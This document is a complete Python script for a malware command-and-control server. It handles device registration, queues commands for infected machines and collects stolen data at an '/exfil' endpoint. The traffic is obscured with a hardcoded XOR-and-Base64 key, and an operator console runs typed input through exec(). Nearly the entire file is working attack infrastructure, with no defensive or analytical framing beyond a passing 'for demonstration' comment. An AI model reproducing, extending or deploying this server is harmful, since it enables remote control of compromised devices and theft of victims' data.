#!/usr/bin/env python3

from http.server import BaseHTTPRequestHandler, HTTPServer
import time
import base64
import json
import threading

class C2RequestHandler(BaseHTTPRequestHandler):
    registered_devices = {}
    commands = {}
    exfiltrated_data = {}
    encryption_key = "C2MalwareSecretKey123!"
    
    def simple_xor(self, data, key):
        """Simple XOR encryption for demonstration"""
        key_bytes = key.encode()
        return bytes([data[i] ^ key_bytes[i % len(key_bytes)] for i in range(len(data))])
    
    def encrypt(self, data):
        """Encrypt data with XOR and Base64"""
        if isinstance(data, str):
            data = data.encode()
        encrypted = self.simple_xor(data, self.encryption_key)
        return base64.b64encode(encrypted).decode()
    
    def decrypt(self, encrypted_data):
        """Decrypt data with Base64 and XOR"""
        try:
            encrypted_bytes = base64.b64decode(encrypted_data)
            decrypted = self.simple_xor(encrypted_bytes, self.encryption_key)
            return decrypted.decode()
        except:
            return encrypted_data  # Return as-is if decryption fails
    
    def do_GET(self):
        if self.path.startswith('/command'):
            # Handle command requests
            params = self.parse_query_params(self.path)
            device_id = params.get('device_id', [''])[0]
            registration_id = params.get('registration_id', [''])[0]
            
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.send_header('X-C2-Encrypted', 'true')
            self.end_headers()
            
            if device_id in self.commands:
                # Encrypt the commands
                command_list = self.commands[device_id]
                response = "commands:\n" + "\n".join(command_list)
                encrypted_response = self.encrypt(response)
                
                self.wfile.write(encrypted_response.encode())
                del self.commands[device_id]  # Clear commands after sending
            else:
                # Encrypt empty response
                encrypted_response = self.encrypt("commands:\n")
                self.wfile.write(encrypted_response.encode())
                
        elif self.path.startswith('/register'):
            # Handle registration
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.send_header('X-C2-Encrypted', 'true')
            self.end_headers()
            
            # Encrypt registration response
            registration_id = str(int(time.time()))
            response = f"registration_id:{registration_id}"
            encrypted_response = self.encrypt(response)
            self.wfile.write(encrypted_response.encode())
            
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        if self.path == '/register':
            # Handle device registration
            params = self.parse_query_params(post_data)
            device_id = params.get('device_id', [''])[0]
            
            if device_id:
                registration_id = str(int(time.time()))
                self.registered_devices[device_id] = registration_id
                
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.send_header('X-C2-Encrypted', 'true')
                self.end_headers()
                
                # Encrypt registration response
                response = f"registration_id:{registration_id}"
                encrypted_response = self.encrypt(response)
                self.wfile.write(encrypted_response.encode())
                return
                
        elif self.path == '/exfil':
            # Handle data exfiltration
            try:
                # Decrypt the exfiltrated data
                decrypted_data = self.decrypt(post_data)
                params = self.parse_query_params(decrypted_data)
                
                device_id = params.get('device_id', [''])[0]
                data_type = params.get('data_type', [''])[0]
                data = params.get('data', [''])[0]
                
                if device_id and data_type:
                    if device_id not in self.exfiltrated_data:
                        self.exfiltrated_data[device_id] = {}
                    
                    self.exfiltrated_data[device_id][data_type] = data
                    
                    self.send_response(200)
                    self.send_header('Content-type', 'text/plain')
                    self.send_header('X-C2-Encrypted', 'true')
                    self.end_headers()
                    
                    # Encrypt success response
                    encrypted_response = self.encrypt("success")
                    self.wfile.write(encrypted_response.encode())
                    
                    # Log the exfiltrated data (decrypted)
                    print(f"Exfiltrated data from {device_id} - {data_type}:")
                    if data_type == "command_result":
                        # Try to decrypt command results
                        try:
                            decrypted_result = self.decrypt(data)
                            print(f"Command result: {decrypted_result[:200]}...")  # Truncate long output
                        except:
                            print(f"Command result: {data[:200]}...")
                    else:
                        print(f"Data: {data[:200]}...")  # Truncate long output
                    return
            except Exception as e:
                print(f"Error handling exfiltration: {e}")
                
        self.send_response(404)
        self.end_headers()
    
    def parse_query_params(self, query_string):
        params = {}
        if '?' in query_string:
            query_string = query_string.split('?')[1]
        
        for pair in query_string.split('&'):
            if '=' in pair:
                key, value = pair.split('=', 1)
                if key not in params:
                    params[key] = []
                params[key].append(value)
        return params
    
    def log_message(self, format, *args):
        # Custom logging to see C2 activity
        print(f"C2 Server: {format % args}")

def send_command(device_id, command):
    """Send command to a specific device"""
    if device_id not in C2RequestHandler.commands:
        C2RequestHandler.commands[device_id] = []
    C2RequestHandler.commands[device_id].append(command)
    print(f"Command sent to {device_id}: {command}")

def get_exfiltrated_data(device_id, data_type=None):
    """Get exfiltrated data for a device"""
    if device_id in C2RequestHandler.exfiltrated_data:
        if data_type:
            return C2RequestHandler.exfiltrated_data[device_id].get(data_type, "No data")
        else:
            return C2RequestHandler.exfiltrated_data[device_id]
    return "No data"

def list_registered_devices():
    """List all registered devices"""
    return list(C2RequestHandler.registered_devices.keys())

# Start the C2 server
if __name__ == '__main__':
    server_address = ('', 8000)
    httpd = HTTPServer(server_address, C2RequestHandler)
    
    # Start server in a separate thread
    server_thread = threading.Thread(target=httpd.serve_forever)
    server_thread.daemon = True
    server_thread.start()
    
    print('Enhanced C2 Server running on port 8000...')
    print('Encryption: XOR + Base64')
    print('Ready to handle encrypted C2 communication')
    print('\nCommands:')
    print('  send_command(device_id, command) - Send command to device')
    print('  get_exfiltrated_data(device_id, data_type) - Get exfiltrated data')
    print('  list_registered_devices() - List registered devices')
    print('  exit - Stop the server')
    
    # Simple command interface
    while True:
        try:
            cmd = input("> ")
            if cmd.lower() == 'exit':
                break
            elif cmd.startswith('send_command('):
                exec(cmd)
            elif cmd.startswith('get_exfiltrated_data('):
                exec(cmd)
            elif cmd.startswith('list_registered_devices('):
                exec(cmd)
            else:
                print("Available commands: send_command, get_exfiltrated_data, list_registered_devices, exit")
        except Exception as e:
            print(f"Error: {e}")
    
    httpd.shutdown()
    print("C2 Server stopped")
